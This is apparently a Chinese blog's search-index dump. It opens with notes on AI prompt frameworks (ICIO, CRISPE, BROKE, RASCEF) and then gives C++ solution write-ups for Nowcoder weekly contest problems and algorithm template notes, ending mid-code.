更多的背景信息，引导模型做出更贴合需求的回复，比如你要他写的这段文字用在什么场景的、达到什么目的的 📖 Input Data (输入数据) ：告诉 AI 你这次你要他处理的数据。 比如你要他翻译那么你每次要他翻译的句子就是「输入数据」 📤 Output Indicator (输出格式) ：告诉 AI 他输出的时候要用什么格式、风格、类型，如果你无所谓它输出时候的格式，也可以不写 # Intruction 描述：请将以下的法文段落翻译成英文。 重要性：翻译的准确性对于我们的商务报告至关重要。 # Context 场景： 这段法文将用于我们公司的年度商务报告。 目的：报告将呈现给公司的股东和潜在投资者，所以翻译需要准确且专业。 # Input Data \"La croissance économique de la France a été stable au cours des dernières années, malgré les défis mondiaux.\" # Output Indicator 风格：正式和专业的商务英文风格。 注意事项：请确保翻译内容无语法错误，并保持原文的意思。 CRISPE 框架 😊 Capacity and Role （角色） ：告诉 AI 你要他扮演的角色，比如老师、翻译官等等 📜 Insight (背景) ：告诉 AI 你让他扮演这个角色的背景，比如扮演老师是要教自己 10 岁的儿子等等 📌 Statement (任务) ：告诉 AI 你要他做什么任务 🎨 Personality (格式) ：告诉 AI 用什么风格、方式、格式来回答 🧪 Experiment (实验) ：请求 AI 为你回复多个示例（如果不需要，可无） # Capacity and Role 描述：我希望你扮演一名经验丰富的小学数学老师。 特点：具备耐心和鼓励性的教学风格，能够简单明了地解释数学概念。 # Insight 学生信息：你将为我的10岁的儿子提供帮助，他目前正在学习小学四年级的数学。 学习环境：他在家中进行在线学习，有时会遇到一些数学问题需要帮助。 # Statement 描述：请帮助解答以下数学问题，并提供解题步骤。 重要性：确保解答方法适合10岁儿童的理解能力。 # Personality 风格：友好、鼓励性，使用简单易懂的语言。 示例：可以使用实际生活中的例子来解释数学概念。 # Experiment 描述：如果可能，请为每个问题提供两种不同的解题方法。 目的：增强孩子的数学思维和解题能力。 BROKE框架 🌄 Background (背景)：说明背景，提供充足信息 🎭 Role (角色)：你要 AI 扮演的角色是什么 🎯 Objectives (目标/任务)：你要 AI 做的事情的一个描述 🔑 Key Result (关键结果)：对于 AI 输出的回答，在风格、格式、内容等方面的要求 🌟 Evolve (改进)：在 AI 给出回答以后，三种调整、改进方法 # Background 项目描述：我们正在启动一个新的软件开发项目，目标是为中小企业提供一款高效的财务管理工具。 团队组成：项目团队由5名开发人员、2名设计师、1名测试工程师和1名产品经理组成。 # Role 描述：我希望你扮演一名经验丰富的项目经理。 特点：具备出色的项目管理技能，能够确保项目按时完成并满足预定的质量标准。 # Objectives 描述：请帮助我们制定一个详细的项目计划，包括项目的各个阶段、关键里程碑、资源分配和风险管理。 # Key Result 输出格式：项目计划应以Gantt图的形式呈现，并包括每个任务的开始和结束日期、负责人和依赖关系。 关键指标：确保项目计划考虑到所有潜在的风险，并为每个风险提供了相应的应对策略。 # Evolve 反馈机制：在项目计划制定完成后，请提供一个反馈机制，以便团队成员可以提出他们的建议和改进意见。 迭代：根据团队的反馈和项目进展，每两周对项目计划进行一次迭代和更新。 持续监控：提供一个机制，以便我们可以实时监控项目的进展和状态。 RASCEF框架 🎭 Role (角色)：这就是 AI 需要扮演的人，他可以是电子邮件营销人员、项目经理、厨师或您能想到的任何其他角色 🔍 Action (行动)：这是人工智能需要做的，例如编写项目执行计划 📝 Script (步骤)：这些是 A 完成操作应遵循的步骤 🌐 Content (上下文)：这是背景信息或情况 🔍 Example (示例)：这些是说明这一点的特定实例，它们帮助人工智能理解语气和思维/写作风格 📄 Format (格式)：这是 AI 应该呈现其答案的方式，它可以是段落、列表、对话或任何其他格式 # Role 描述：我希望你扮演一名经验丰富的电子邮件营销人员。 特点：具备出色的市场分析能力，了解当前的电子邮件营销趋势和最佳实践。 # Action 任务：请为我们制定一个电子邮件营销策略，包括目标受众、内容策划和发送频率。 # Script 1.分析目标受众的特点和需求。 2.设计电子邮件的内容和格式。 3.制定发送计划和频率。 4.设计跟踪和分析反馈的机制。 # Content 公司背景：我们是一家新兴的健康食品品牌，目标受众为20-40岁的健康生活爱好者。 营销目标：提高品牌知名度，增加网站流量和促进产品销售。 # Example 内容建议：可以设计一系列关于健康饮食的小贴士，每周发送一次。 风格：友好、鼓励性，使用简单易懂的语言。 # Format 电子邮件模板：使用清晰的标题、引人入胜的图片和简洁的文本内容。 响应式设计：确保电子邮件在各种设备上都能正常显示。 希望这样的格式和内容满足您的需求，如有其他修改或补充，请告诉我。 参考链接： [你要牢记的四个常用AI提示词框架：ICIO、CRISPE、BROKE、RASCEF，有助于获取更加稳定和高质量的内容-阿里云开发者社区 (aliyun.com)](https://developer.aliyun.com/article/1490356#:~:text=BROKE 框架 强调了任务的背景、角色、目标、关键输出和持续改进。,它特别适用于那些需要 AI 在明确的背景和角色下，为用户提供目标导向的输出并持续优化的场景。) ","date":"2024-08-24","objectID":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/:3:0","tags":[null],"title":"1-1 Markdown学习(选做)","uri":"/posts/homework/markdown%E5%AD%A6%E4%B9%A0/"},{"categories":["算法和数据结构"],"content":"A.两数之和\r签到题 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ int z; cin \u003e\u003e z; if(z == 1 || z == 2) cout \u003c\u003c \"NO\"; else cout \u003c\u003c \"YES\"\u003c\u003c'\\n'\u003c\u003c1 \u003c\u003c ' ' \u003c\u003c z - 1; return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/:1:0","tags":["算法"],"title":"牛客周赛Round52","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/"},{"categories":["算法和数据结构"],"content":"B.小红装匣子\r可以发现1*2的物块怎么放都无所谓，而1 * 3的物块只能放偶数个，先放完后者再放前者贪心。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; int main(){ int t; cin \u003e\u003e t; while(t--){ ll a, b, n; cin \u003e\u003e a \u003e\u003e b \u003e\u003e n; if(2 * a + 3 * b \u003c 2 * n) cout \u003c\u003c \"NO\" \u003c\u003c '\\n'; else{ ll d = min(n / 3, b / 2); n -= d * 3; if(n \u003e a) cout \u003c\u003c \"NO\" \u003c\u003c '\\n'; else cout \u003c\u003c \"YES\" \u003c\u003c '\\n'; } } return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/:2:0","tags":["算法"],"title":"牛客周赛Round52","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/"},{"categories":["算法和数据结构"],"content":"C.小红的数字对对碰\r可以发现只有以下几种情况可以减少数组长度： 负负、负正、负零、零零、零正 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll a[100010]; unordered_map\u003cll, ll\u003e mp; int main(){ int n; cin \u003e\u003e n; int cnt0 = 0, cnt1 = 0, cnt_1 = 0; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i], mp[a[i]]++; for(int i = 1; i \u003c= n; i++){ if(a[i] == 0) cnt0++; else if(a[i] \u003e 0) cnt1++; else cnt_1++; } int p1 = 0, p_1 = 0; for(auto [k, v] : mp){ if(v \u003e 1){ if(k \u003e 0) p1 += v / 2; else p_1 += v / 2; } } if(cnt1 == cnt_1){ cout \u003c\u003c cnt0 % 2; }else if(cnt1 \u003e cnt_1){ cnt0 %= 2; if(cnt0 \u0026\u0026 cnt_1) cnt_1--, cnt0--; cnt1 -= cnt_1; if(cnt1 \u003e 1){ int d = min(cnt1 / 2, p1); cnt1 -= d * 2; } cout \u003c\u003c cnt1 + cnt0; }else{ cnt_1 -= cnt1; int d = min(cnt_1, cnt0); cnt_1 -= d; cnt0 -= d; if(cnt_1 \u003e 1){ cnt_1 %= 2; } cout \u003c\u003c cnt_1 + (cnt0 % 2); } return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/:3:0","tags":["算法"],"title":"牛客周赛Round52","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/"},{"categories":["算法和数据结构"],"content":"D.小红的最大字典序\r保证相对顺序插入，所以可以把所有串的第一位放进去后再放第二位以此类推。使用堆维护字典序最大，每次把串的第一位放进去 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ int n; cin \u003e\u003e n; string s; priority_queue\u003cstring, vector\u003cstring\u003e, less\u003c\u003e\u003e que; for(int i = 0; i \u003c n; i++){ cin \u003e\u003e s; que.push(s); } while(!que.empty()){ s = que.top(); que.pop(); cout \u003c\u003c s[0]; s.erase(0, 1); if(s != \"\") que.push(s); } return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/:4:0","tags":["算法"],"title":"牛客周赛Round52","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/"},{"categories":["算法和数据结构"],"content":"E.小红的图上加边\r并查集维护连通块的最大元素值，然后从小加到大。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll fa[100010], w[100010]; int find(int x){ if(fa[x] != x){ fa[x] = find(fa[x]); } return fa[x]; } void add(int a, int b){ int faa = find(a), fbb = find(b); if(faa == fbb) return; fa[faa] = fbb; w[fbb] = max(w[fbb], w[faa]); } int main(){ ll ans = 0; int n, m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++) fa[i] = i; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e w[i]; for(int i = 1; i \u003c= n; i++){ int u, v; cin \u003e\u003e u \u003e\u003e v; add(u, v); } priority_queue\u003cll, vector\u003cll\u003e, greater\u003cll\u003e\u003e que; for(int i = 1; i \u003c= n; i++){ if(find(i) == i){ que.push(w[find(i)]); } } while(que.size() \u003e 1){ ll a1 = que.top(); que.pop(); ll a2 = que.top(); que.pop(); a1 = max(a1, a2); ans += a1; que.push(a1); } cout \u003c\u003c ans; return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/:5:0","tags":["算法"],"title":"牛客周赛Round52","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/"},{"categories":["算法和数据结构"],"content":"F.小红的括号串\r(和)的数量相同就满足条件。 当数量相同时，假设不是匹配的括号串，失配的）有x个，那么在这x个）之后一定有x个（适配，此外去掉这个2x个括号的括号串都是匹配的。所以通过循环移位，可以让这x个括号对匹配上。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; #define M 1000000007 #define N 200000 int i,j,k,n,m,t,d; ll jc[N+50],inv[N+50],res; ll su(ll a,ll b){a+=b;return (a\u003e=M)?a-M:a;} ll ksm(ll a,ll p){ll res=1;while(p){if(p\u00261){res=res*a%M;}a=a*a%M;p\u003e\u003e=1;}return res;} ll c(ll n,ll m){if(n\u003cm||n\u003c0||m\u003c0){return 0;}return jc[n]*inv[m]%M*inv[n-m]%M;} int main(){ ios::sync_with_stdio(0); cin.tie(0); jc[0]=inv[0]=1; for(i=1;i\u003c=N;i++)jc[i]=jc[i-1]*i%M; inv[N]=ksm(jc[N],M-2); for(i=N-1;i\u003e=1;i--)inv[i]=inv[i+1]*(i+1)%M; string s; cin\u003e\u003en\u003e\u003es; if(n\u00261){ cout\u003c\u003c0; return 0; } for(auto c:s){ if(c=='(')i++; else if(c==')') j++; } cout\u003c\u003cc(n-i-j,n/2-i); return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/:6:0","tags":["算法"],"title":"牛客周赛Round52","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-52/"},{"categories":["算法和数据结构"],"content":"A.两数之和\r当掷n次时，小红有三种情况平局、赢、输，同时赢的概率等于输的概率。小红投第n+1次后，赢仍然赢，输最多是平局，平局有一半几率赢。设n次赢的概率是x，平局是y，有2x+y=1 第n+1次后赢得概率是x+y*0.5。联立得y=1-2x，则x+0.5y=0.5 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll fact[200010]; int main(){ int n; cin \u003e\u003e n; printf(\"%.06f\", 0.5); return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/:1:0","tags":["算法"],"title":"牛客周赛Round53","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/"},{"categories":["算法和数据结构"],"content":"B.小红的字符串\r要么顺着走，要么逆着走 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ string s; cin \u003e\u003e s; int cnt = 0; for(int i = 0, j = s.size() - 1; i \u003c j; i++, j--){ if(s[i] == s[j]) continue; cnt += min(abs(s[j] - s[i]), 26 - abs(s[j] - s[i])); } cout \u003c\u003c cnt; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/:2:0","tags":["算法"],"title":"牛客周赛Round53","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/"},{"categories":["算法和数据结构"],"content":"C.小红的 01 消除\r可以发现操作1和3都没有用，直接统计能进行多少次操作2和y去min就行 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int n; cin \u003e\u003e n; string s; cin \u003e\u003e s; int x, y, z; cin \u003e\u003e x \u003e\u003e y \u003e\u003e z; int cnt = 1; int lhave = 0; int ans = 0; for(int i = 1; i \u003c s.size(); i++){ if(s[i] != s[i - 1]){ if(s[i] == '1'){ lhave += cnt; }else{ ans += min(cnt, lhave); lhave -= min(cnt, lhave); } cnt = 1; }else{ cnt++; } } if(s[s.size() - 1] == '1'){ ans += min(cnt, lhave); } cout \u003c\u003c min(ans, y); } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/:3:0","tags":["算法"],"title":"牛客周赛Round53","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/"},{"categories":["算法和数据结构"],"content":"D.小红组比赛\r一眼分组dp，注意相差最小值可以超过target，则dp数组开得范围应该是100*50（n * ai) #include\u003cbits/stdc++.h\u003e using namespace std; int dp[101][5010]; int a[110][25]; int main(){ int n, m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++){ for(int j = 1; j \u003c= m; j++){ cin \u003e\u003e a[i][j]; } } int target; cin \u003e\u003e target; for(int i = 0; i \u003c= n; i++){ for(int j = 1; j \u003c= 5000; j++){ dp[i][j] = -1; } } for(int i = 1; i \u003c= n; i++){ dp[i][0] = 0; for(int j = 1; j \u003c= m; j++){ for(int k = 5000; k \u003e= a[i][j]; k--){ if(dp[i - 1][k - a[i][j]] != -1){ dp[i][k] = max(dp[i - 1][k - a[i][j]] + 1, dp[i][k]); } } } for(int j = 1; j \u003c= 5000; j++) if(dp[i][j] != i) dp[i][j] = -1; } int ans = 1e9; for(int i = 5000; i \u003e= 0; i--){ if(dp[n][i] == n){ ans = min(ans, abs(i - target)); } } cout \u003c\u003c ans; return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/:4:0","tags":["算法"],"title":"牛客周赛Round53","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/"},{"categories":["算法和数据结构"],"content":"E.折半丢弃\r答案具有单调性，若MEX可以为X，则一定可以是更小的，若不能为X，那么更大的一定不能。 二分答案。接下来就是怎么check。 在check的时候，如果从低位开始考虑会面临第x位没有，但有多个数折半之后可以变成x。不妨倒过来想，因为要检查MEX能不能是mid+1，说明从0到mid之间的数全都存在，对于每个数的折半都是固定的路线，先把所有大于mid的折半到mid以内，然后再从mid开始看存不存在值，若存在就把剩下的继续折半继承下去。若出现不存在的则说明MEX不是能是mid+1。若全部存在则可以。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int n; cin \u003e\u003e n; vector\u003cint\u003e a(n + 1, 0); for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; int l = 0, r = n - 1; auto check = [\u0026](int x){ vector\u003cint\u003e vis(x + 1, 0); for(int i = 1; i \u003c= n; i++){ int t = a[i]; while(t \u003e x) t /= 2; vis[t]++; } for(int i = x; i \u003e= 0; i--){ if(vis[i] == 0){ return false; } vis[i / 2] += vis[i] - 1; } return true; }; while(l \u003c= r){ int mid = (l + r) \u003e\u003e 1; if(check(mid)) l = mid + 1; else r = mid - 1; } cout \u003c\u003c l \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/:5:0","tags":["算法"],"title":"牛客周赛Round53","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/"},{"categories":["算法和数据结构"],"content":"F.小红走矩阵\r五种状态，每种记录到达x，位置替换和不替换的最小步数。最后取最小值 #include\u003cbits/stdc++.h\u003e using namespace std; char a[1010][1010]; int dx[] = {-1,1,0,0}; int dy[] = {0,0,-1,1}; int st[2][1010][1010]; int main(){ int n, m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++) for(int j = 1; j \u003c= m; j++){ cin \u003e\u003e a[i][j]; } int ans = 1e9; for(int i = 0; i \u003c 5; i++){ queue\u003carray\u003cint, 3\u003e \u003e que;//x y val memset(st, 0, sizeof st); que.push({1, 1, 0}); while(!que.empty()){ auto [x, y, v] = que.front(); que.pop(); for(int j = 0; j \u003c 4; j++){ if(i == j) continue; int xx = x + dx[j], yy = y + dy[j]; if(xx \u003e= 1 \u0026\u0026 xx \u003c= n \u0026\u0026 yy \u003e= 1 \u0026\u0026 yy \u003c= m){ if(v == 0){//can replace if(a[xx][yy] == 'X'){ if(st[1][xx][yy]) continue; if(i == 4) continue; st[1][xx][yy] = st[0][x][y] + 1; que.push({xx, yy, 1}); }else{ if(st[0][xx][yy]) continue; st[0][xx][yy] = st[0][x][y] + 1; que.push({xx, yy, 0}); } }else{ if(a[xx][yy] == 'X' || st[1][xx][yy]) continue; st[1][xx][yy] = st[1][x][y] + 1; que.push({xx, yy, 1}); } } } } if(st[0][n][m] == 0 \u0026\u0026 st[1][n][m] == 0) continue; if(st[0][n][m] \u0026\u0026 st[1][n][m]) ans = min(ans, min(st[0][n][m], st[1][n][m])); if(st[0][n][m]) ans = min(ans, st[0][n][m]); if(st[1][n][m]) ans = min(ans, st[1][n][m]); } if(ans == 1e9) cout \u003c\u003c -1; else cout \u003c\u003c ans; return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/:6:0","tags":["算法"],"title":"牛客周赛Round53","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/"},{"categories":["算法和数据结构"],"content":"F.游游的删点直径\r换根DP。 可以发现f(u)的值要么是在u的子树中，要么是以父亲为根的子树中。 在u的子树中，则有两种，一种是指向u的路径，一种是经过u的子节点的路径即一个v形。 在转移时，v要得到以父亲u为根的子树中最长的路径，要么是原先不经过u的路径且排除掉的经过v路径的最大值，要么是u连接的路径（指向u的最大和次大相连得到）。两者取最大值即可。 前者则有子节点提供经过子节点的最长路径即可（dmx）。 #include\u003cbits/stdc++.h\u003e using namespace std; vector\u003cint\u003e g[100010]; int d1[100010], d2[100010], dmx[100010], ans[100010]; void dfs1(int fa, int pos){ for(auto to : g[pos]){ if(fa == to) continue; dfs1(pos, to); if(d1[to] + 1 \u003e d1[pos]){ d2[pos] = d1[pos];//指向pos的次长路径 d1[pos] = d1[to] + 1;//指向pos的最长路径 }else if(d1[to] + 1 \u003e d2[pos]){ d2[pos] = d1[to] + 1; } dmx[pos] = max(dmx[pos], dmx[to]); } dmx[pos] = max(dmx[pos], d1[pos] + d2[pos]);//pos子树中包括pos的最长路径 } void dfs2(int fa, int pos, int p1, int p2){ multiset\u003cint\u003e s1, s2; s1.insert(0), s2.insert(0); s1.insert(p1), s2.insert(p2);//p1是父亲那边的最长路径，p2是父亲那边指向父亲的最长路径 //s1表示不包括pos节点的路径长度 //s2表示指向pos节点的路径长度 for(auto to : g[pos]){ if(to == fa) continue; s1.insert(dmx[to]); s2.insert(d1[to] + 1); } ans[pos] = *s1.rbegin();//*s1.rbegin()表示最后一个元素，即最大的元素 for(auto to : g[pos]){ if(to == fa) continue; s1.erase(s1.find(dmx[to])); s2.erase(s2.find(d1[to] + 1)); int np1 = max(*s1.rbegin(), *s2.rbegin() + *prev(prev(s2.end()))); //最大值要么是不包括pos的最大路径长度，要么是pos接连的最大路径长度 //*prev(prev(s2.end()))表示倒数第二个元素，即次大的元素 int np2 = *s2.rbegin() + 1; dfs2(pos, to, np1, np2); s1.insert(dmx[to]); s2.insert(d1[to] + 1); } } int main(){ int n; cin \u003e\u003e n; for(int i = 1; i \u003c= n - 1; i++){ int u, v; cin \u003e\u003e u \u003e\u003e v; g[u].push_back(v); g[v].push_back(u); } dfs1(1, 1); dfs2(1, 1, 0, 0); for(int i = 1; i \u003c= n; i++) cout \u003c\u003c ans[i] \u003c\u003c '\\n'; return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/:7:0","tags":["算法"],"title":"牛客周赛Round53","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-53/"},{"categories":["算法和数据结构"],"content":"A.清楚姐姐的糖葫芦\r签到题 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ string s; cin \u003e\u003e s; int ans = 0; for(auto i : s) if(i == 'o') ans++; cout \u003c\u003c ans; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-54/:1:0","tags":["算法"],"title":"牛客周赛Round54","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-54/"},{"categories":["算法和数据结构"],"content":"B.清楚姐姐买竹鼠\r注意可能有多买更便宜的情况 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ ll a, b, x; cin \u003e\u003e a \u003e\u003e b \u003e\u003e x; if(3LL * a \u003c= b){ cout \u003c\u003c x * a; }else{ ll ans = (x + 2LL) / 3LL * b; ans = min(ans, (x / 3LL) * b + (x % 3LL) * a); cout \u003c\u003c ans; } } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-54/:2:0","tags":["算法"],"title":"牛客周赛Round54","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-54/"},{"categories":["算法和数据结构"],"content":"C.竹鼠饲养物语\r模拟 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; int main(){ int n, m; cin \u003e\u003e n \u003e\u003e m; vector\u003cll\u003e a(n + 1); map\u003cll, ll\u003e mp; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i], mp[a[i]]++; ll ans = 0; ll d = 1e9 + 10; ll last = 0; for(auto [k, v] : mp){ if(last == k - 1){ d = min(d, v); ans += d; last = k; }else{ break; } } cout \u003c\u003c ans; return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-54/:3:0","tags":["算法"],"title":"牛客周赛Round54","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-54/"},{"categories":["算法和数据结构"],"content":"D.清楚姐姐跳格子\rBFS #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; int main(){ int n; cin \u003e\u003e n; vector\u003clong long\u003e a(n + 1); vector\u003clong long\u003e st(n + 1, -1); for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; queue\u003cint\u003e que; int cnt = 0; st[1] = 0; que.push(1); while(!que.empty()){ auto fr = que.front(); que.pop(); for(int i = 1; i * i \u003c= a[fr] \u0026\u0026 i \u003c= n; i++){ if(a[fr] % i == 0){ ll d1 = fr + i, d2 = fr - i; if(d1 \u003c= n \u0026\u0026 st[d1] == -1) st[d1] = st[fr] + 1, que.push(d1); if(d2 \u003e= 1 \u0026\u0026 st[d2] == -1) st[d2] = st[fr] + 1, que.push(d2); d1 = fr + (a[fr] / i), d2 = fr - (a[fr] / i); if(d1 \u003c= n \u0026\u0026 st[d1] == -1) st[d1] = st[fr] + 1, que.push(d1); if(d2 \u003e= 1 \u0026\u0026 st[d2] == -1) st[d2] = st[fr] + 1, que.push(d2); } } } cout \u003c\u003c st[n]; return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-54/:4:0","tags":["算法"],"title":"牛客周赛Round54","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-54/"},{"categories":["算法和数据结构"],"content":"E.清楚姐姐的布告规划\rdp[i]表示覆盖到第i位需要的布告数量。 dp[i] = min(dp[i], dp[i - a[j]] + 1)， a[j]是这个布告的长度，i的范围是i±（a[j]-1） #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int n; cin \u003e\u003e n; vector\u003cint\u003e a(n + 1); for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; vector\u003cint\u003e dp(n + 1, 1e5); dp[0] = 0; for(int i = 1; i \u003c= n; i++){ for(int j = max(i, a[i]); j \u003c= min(n, i + a[i] - 1); j++){ dp[j] = min(dp[j], dp[j - a[i]] + 1); } } if(dp[n] == 1e5) cout \u003c\u003c -1 \u003c\u003c '\\n'; else cout \u003c\u003c dp[n] \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-08-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-54/:5:0","tags":["算法"],"title":"牛客周赛Round54","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-54/"},{"categories":["算法和数据结构"],"content":"随机哈希值\r使用random_device和mt19937生成随机哈希值，用法如下： random_device rd; mt19937 mt(rd()); ull myhash = mt();阶乘and阶乘逆元\r线性递推求阶乘逆元： ll fact[N], inv[N]; inv[n] = ksm(fact[n], mod - 2, mod);//先求最后一项的逆元 for(int i = n - 1; i \u003e= 0; i--) inv[i] = inv[i + 1] * (i + 1) % mod; //递推求逆元 存2到m因子\rstd::vector\u003cstd::vector\u003cint\u003e\u003e d(m + 1); for (int i = 1; i \u003c= m; i++) { for (int j = 2 * i; j \u003c= m; j += i) { d[j].push_back(i); } }区间 约束下求某点贡献最大值\r现在小w正在玩一款经典游戏——大鱼吃小鱼。 游戏规则如下：玩家操控一条初始重量为 $\\mathrm{x}$ 的鱼，它的目标是吃掉所有不超过自身当前重量的鱼。每当吃掉一条重量为 $\\mathrm{y}$ 的鱼，那么自身重量也会立即增长 $\\mathrm{y}$。 在游戏过程中，共会陆续出现 $\\mathrm{n}$ 条鱼。其中第 $\\mathrm{i}$ 条鱼重 $\\mathrm{y_i}$，其出现时间段为 $\\mathrm{\\left[l_i,r_i\\right)}$，即这条鱼会在时刻 $\\mathrm{l_i}$ 出现，并在时刻 $\\mathrm{r_i}$ 前消失（包含 $\\mathrm{l_i}$ 但不包含 $\\mathrm{r_i}$）。只有当前时刻位于 $\\mathrm{\\left[l_i,r_i\\right)}$​ 时，小w才能操作自己的鱼去吃掉它。 鉴于小w的手速非凡，吃鱼的耗时可以忽略不计。不过最近他懒癌犯了，因此他打算只选择某一时刻进行捕食，并最大化他的鱼的重量。请计算他的鱼可能达到的最大重量。 数据范围： $\\mathrm{n,x}(\\mathrm{1 \\le n \\le 10^5},\\mathrm{\\sum n \\le 10^5},\\mathrm{1 \\le x \\le 10^9})$​ $\\mathrm{l_i,r_i,y_i}(\\mathrm{1 \\le l_i \u003c r_i \\le 10^9},\\mathrm{1 \\le y_i \\le 10^9})$ 解法：离散化+树状数组+暴力枚举 从小到大枚举区间可行的右边界，优先队列处理存在交集的区间，树状数组维护枚举点可以获得的贡献。 初始是x值，贪心处理每次吃完≤x的所有值，替换x，直到x不再变化。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; struct Fenwick{ int n; vector\u003cll\u003e tr; void resize(ll m){ n = m; tr.resize(n + 1); for(int i = 0; i \u003c= m; i++) tr[i] = 0; } void update(ll u, ll x){ for(int i = u; i \u003c= n; i += i \u0026 -i) tr[i] += x; } ll query(ll x){ ll sum = 0; for(int i = x; i \u003e= 1; i -= i \u0026 